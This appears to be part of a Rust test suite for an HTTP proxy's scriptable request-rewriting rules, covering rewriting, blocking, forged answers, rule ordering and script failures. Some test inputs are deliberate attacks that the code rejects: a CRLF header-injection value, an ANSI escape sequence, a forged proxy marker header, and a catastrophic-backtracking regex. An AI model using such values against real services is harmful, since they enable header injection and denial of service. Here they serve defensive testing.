    const HOOK: &str = "function request(req, ctx) {
        switch (req.path) {
            case '/keep': return;
            case '/rewrite':
                return { request: { method: 'PUT', target: req.target + '&x=1',
                    headers: req.headers.concat([['X-Hook', ctx.engine + ' ' + ctx.host + ' ' + ctx.rule + ' ' + req.body]]),
                    body: 'new body' } };
            case '/headers': return { request: { headers: { 'X-Only': 1 } } };
            case '/block': return { block: 'no \\u001b[2J admin' };
            case '/bare': return { block: true };
            case '/answer':
                return { response: { status: 201, headers: { 'Content-Type': 'text/plain', 'Content-Length': '999',
                    'Transfer-Encoding': 'chunked', 'X-Brainproxy-Answer': 'forged' }, body: 'hi ' + req.method } };
            case '/bytes': return { response: { headers: [['A', 'b']], bodyBase64: 'AP8=' } };
            case '/empty': return { response: { status: 204 } };
        }
    }";

    #[test]
    fn a_request_script_keeps_rewrites_blocks_or_answers_a_request() {
        let (hook, dir) = request_rule_of(3, HOOK);
        validate_rule(&hook).unwrap();
        verify_script(&hook).unwrap();
        let set = RuleSet::compile(std::slice::from_ref(&hook)).unwrap();
        let run = |req: &str| set.request(Engine::Send, "h.test", req.as_bytes().to_vec());
        let text = |b: &[u8]| String::from_utf8_lossy(b).into_owned();

        let keep = "GET /keep HTTP/1.1\r\nHost: h.test\r\n\r\n";
        let out = run(keep);
        assert!(!out.changed() && out.stopped.is_none() && out.failed.is_empty(), "{out:?}");
        assert_eq!(out.bytes, keep.as_bytes());

        // Rewritten: the line, the headers and the body it gave, framed by brainproxy.
        let out = run("POST /rewrite?a=1 HTTP/1.1\r\nHost: h.test\r\nContent-Length: 3\r\n\r\nold");
        assert_eq!(
            text(&out.bytes),
            "PUT /rewrite?a=1&x=1 HTTP/1.1\r\nHost: h.test\r\nX-Hook: send h.test 3 old\r\nContent-Length: 8\r\n\r\nnew body"
        );
        assert_eq!((out.ids(), out.stopped.is_none()), (vec![3], true));
        assert_eq!(out.edits(), [Edit { rule: Some(3), ..Default::default() }]);
        // Headers alone replace the headers; the body stays, with a length of its own.
        let out = run("POST /headers HTTP/1.1\r\nHost: h.test\r\nContent-Length: 2\r\n\r\nab");
        assert_eq!(text(&out.bytes), "POST /headers HTTP/1.1\r\nX-Only: 1\r\nContent-Length: 2\r\n\r\nab");
        // A chunked body is handed over as its data, and sent with a length.
        let chunked = "POST /headers HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n2\r\nab\r\n0\r\n\r\n";
        assert_eq!(text(&run(chunked).bytes), "POST /headers HTTP/1.1\r\nX-Only: 1\r\nContent-Length: 2\r\n\r\nab");

        // Blocked: nothing to send, with the reason made safe to show.
        let out = run("GET /block HTTP/1.1\r\nHost: h.test\r\n\r\n");
        let stopped = out.stopped.clone().unwrap();
        assert_eq!(stopped.stop, Stop::Block("no \\u{1b}[2J admin".into()));
        assert_eq!(stopped.message(), "blocked by the script of match-and-replace rule 3: no \\u{1b}[2J admin");
        assert_eq!(out.edits(), [Edit { rule: Some(3), outcome: Some(Outcome::Blocked), ..Default::default() }]);
        assert!(out.noted() && !out.changed());
        let bare = run("GET /bare HTTP/1.1\r\n\r\n").stopped.unwrap();
        assert_eq!(bare.message(), "blocked by the script of match-and-replace rule 3");

        // Answered: framed by brainproxy, with its own mark the script can't forge or drop.
        let out = run("GET /answer HTTP/1.1\r\nHost: h.test\r\n\r\n");
        let answer = text(out.stopped.as_ref().unwrap().answer().unwrap());
        assert_eq!(
            answer,
            "HTTP/1.1 201 Created\r\nContent-Type: text/plain\r\nContent-Length: 6\r\nX-Brainproxy-Answer: rule 3; this \
             response is the rule's script's, the target sent nothing\r\n\r\nhi GET"
        );
        assert_eq!(out.edits()[0].outcome, Some(Outcome::Answered));
        // The answer to a HEAD has no body, and says how long it would be.
        let head = run("HEAD /answer HTTP/1.1\r\n\r\n").stopped.unwrap();
        assert!(text(head.answer().unwrap()).ends_with("Content-Length: 7\r\nX-Brainproxy-Answer: rule 3; this response is the rule's script's, the target sent nothing\r\n\r\n"));
        let bytes = run("GET /bytes HTTP/1.1\r\n\r\n").stopped.unwrap();
        let bytes = bytes.answer().unwrap();
        assert!(bytes.starts_with(b"HTTP/1.1 200 OK\r\nA: b\r\nContent-Length: 2\r\n") && bytes.ends_with(&[0x00, 0xff]));
        let empty = run("GET /empty HTTP/1.1\r\n\r\n").stopped.unwrap();
        assert!(text(empty.answer().unwrap()).starts_with("HTTP/1.1 204 No Content\r\nX-Brainproxy-Answer: "));
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn a_request_script_sees_the_rules_before_it_and_stops_the_ones_after() {
        let (hook, dir) = request_rule_of(2, HOOK);
        let before = Rule { applies_to: vec![Engine::Proxy], ..rule(1, RuleLocation::Path, "^/x$", "/answer") };
        let after = Rule { applies_to: vec![Engine::Proxy], ..rule(3, RuleLocation::RequestHeader, "", "X-After: 1") };
        let set = RuleSet::compile(&[before, hook, after]).unwrap();
        let out = set.request(Engine::Proxy, "h.test", b"GET /x HTTP/1.1\r\n\r\n".to_vec());
        // The rule before it made /answer of /x; the one after it had no turn.
        assert_eq!(out.ids(), [1]);
        assert_eq!(out.bytes, b"GET /answer HTTP/1.1\r\n\r\n");
        assert_eq!(out.original.as_deref(), Some(&b"GET /x HTTP/1.1\r\n\r\n"[..]));
        assert_eq!(out.stopped.as_ref().map(|s| s.id), Some(2));
        let outcomes: Vec<_> = out.edits().iter().map(|e| (e.rule, e.outcome)).collect();
        assert_eq!(outcomes, [(Some(1), None), (Some(2), Some(Outcome::Answered))]);
        // Not an engine it applies to: no turn at all.
        assert!(set.request(Engine::Scan, "h.test", b"GET /answer HTTP/1.1\r\n\r\n".to_vec()).stopped.is_none());
        // Nor a response, a WebSocket message or a response's head.
        assert!(!set.rewrites_responses(Engine::Proxy, "h.test"));
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn a_request_script_that_fails_sends_the_request_as_it_was() {
        let req = "GET /a HTTP/1.1\r\nHost: h.test\r\n\r\n";
        for (script, why) in [
            ("function request() { throw new Error('nope'); }", "Error: nope"),
            ("function request() { return 'x'; }", "it returned a string"),
            ("function request() { return [1]; }", "it returned an array"),
            ("function request() { return Promise.resolve(null); }", "promise"),
            ("function request() { return { other: 1 }; }", "no request, block or response"),
            ("function request() { return { block: 'a', response: {} }; }", "block and response"),
            ("function request() { return { block: 5 }; }", "give the reason as a string"),
            ("function request() { return { response: 'x' }; }", "its response is a string"),
            ("function request() { return { response: { status: 101 } }; }", "a code from 200 to 999"),
            ("function request() { return { response: { status: '200' } }; }", "status is a number"),
            ("function request() { return { response: { headers: { 'Bad Name': 'x' } } }; }", "can't be a header's name"),
            ("function request() { return { response: { headers: { A: 'x\\r\\nB: y' } } }; }", "line break or NUL"),
            ("function request() { return { response: { status: 204, body: 'x' } }; }", "which has no body"),
            ("function request() { return { response: { body: 'a', bodyBase64: 'YQ==' } }; }", "give one"),
            ("function request() { return { response: { code: 200 } }; }", "has no \"code\""),
            ("function request() { return { request: { method: 'GET X' } }; }", "can't be a request's method"),
            ("function request() { return { request: { target: '/a b' } }; }", "can't be a request's target"),
            ("function request() { return { request: { headers: [['A']] } }; }", "[name, value] pairs"),
            ("function request() { /^(a+)+$/.test('a'.repeat(40) + 'b'); }", "time limit"),
        ] {
            let (hook, dir) = request_rule_of(5, script);
            let out = RuleSet::compile(&[hook]).unwrap().request(Engine::Proxy, "h.test", req.as_bytes().to_vec());
            assert!(out.stopped.is_none() && !out.changed(), "{script}: {out:?}");
            assert_eq!(out.bytes, req.as_bytes(), "{script}");
            let failed = failed_of(&out);
            assert!(failed.len() == 1 && failed[0].0 == 5 && failed[0].1.contains(why), "{script}: {failed:?}");
            let _ = std::fs::remove_dir_all(dir);
        }
    }

    #[test]
    fn a_request_rule_is_a_script_given_the_whole_request() {
        let (hook, dir) = request_rule_of(1, "function request(req) {}");
        validate_rule(&hook).unwrap();
        let no = |r: Rule| validate_rule(&r).unwrap_err().to_string();
        assert!(no(Rule { replacer: ReplaceKind::Text, script: None, ..hook.clone() }).contains("is a script"));
        assert!(no(Rule { pattern: "x".into(), ..hook.clone() }).contains("takes no --match"));
        assert!(no(Rule { name: Some("X".into()), ..hook.clone() }).contains("takes no --match"));
        assert!(no(Rule { applies_to: vec![Engine::WsToServer], ..hook.clone() }).contains("ws-message rule"));
        // Its script defines request, not replace.
        let (replace, dir2) = request_rule_of(2, "function replace(m) { return m.text; }");
        assert!(verify_script(&replace).unwrap_err().to_string().contains("it defines no request function"));
        // Saved and read back as any rule is: an older build that doesn't know the location skips it.
        let json = serde_json::to_value(&hook).unwrap();
        assert_eq!((json["location"].as_str(), json["replacer"].as_str()), (Some("request"), Some("script")));
        assert_eq!(serde_json::from_value::<Rule>(json).unwrap(), hook);
        let _ = (std::fs::remove_dir_all(dir), std::fs::remove_dir_all(dir2));
    }

    #[test]
    fn a_request_script_may_give_back_what_it_was_given_changed() {
        let (hook, dir) = request_rule_of(
            1,
            "function request(req) {
                if (req.path === '/spread') return { request: { ...req, method: 'PUT' } };
                if (req.path === '/path') return { request: { ...req, path: '/moved', query: 'b=2' } };
                if (req.path === '/both') return { request: { ...req, target: '/x', path: '/y' } };
                if (req.path === '/line') return { request: { ...req, line: 'GET / HTTP/1.1' } };
                if (req.path === '/big') return req.bodyTruncated ? { request: { ...req, method: 'PUT' } } : { block: 'whole' };
                if (req.path === '/bigblock') return req.body.length < 1100000 ? { block: 'seen ' + req.body.length } : null;
            }",
        );
        let set = RuleSet::compile(std::slice::from_ref(&hook)).unwrap();
        let run = |req: Vec<u8>| set.request(Engine::Proxy, "h.test", req);
        // A body that isn't UTF-8 comes back exact, though it came with both forms.
        let mut req = b"POST /spread?a=1 HTTP/1.1\r\nContent-Length: 2\r\n\r\n".to_vec();
        req.extend([0xff, 0x00]);
        let out = run(req);
        assert!(out.bytes.starts_with(b"PUT /spread?a=1 HTTP/1.1\r\n") && out.bytes.ends_with(&[0xff, 0x00]), "{out:?}");
        let out = run(b"GET /path?a=1 HTTP/1.1\r\n\r\n".to_vec());
        assert_eq!(out.bytes, b"GET /moved?b=2 HTTP/1.1\r\n\r\n");
        for path in ["/both", "/line"] {
            let out = run(format!("GET {path} HTTP/1.1\r\n\r\n").into_bytes());
            assert!(!out.changed() && out.failed.len() == 1, "{path}: {out:?}");
        }
        // A body over what a script is handed is cut for it, and said; one it gives back as it was
        // handed over goes whole.
        let body = vec![b'a'; MAX_SCRIPT_BODY + 10];
        let mut req = format!("POST /big HTTP/1.1\r\nContent-Length: {}\r\n\r\n", body.len()).into_bytes();
        req.extend(&body);
        let out = run(req);
        assert!(out.bytes.starts_with(b"PUT /big HTTP/1.1\r\n") && out.bytes.ends_with(&body), "{:?}", out.failed);
        // And a large body doesn't take the request past the script.
        let mut req = format!("POST /bigblock HTTP/1.1\r\nContent-Length: {}\r\n\r\n", body.len()).into_bytes();
        req.extend(&body);
        assert_eq!(run(req).stopped.map(|s| s.stop), Some(Stop::Block(format!("seen {MAX_SCRIPT_BODY}"))));
        let _ = std::fs::remove_dir_all(dir);
    }
}
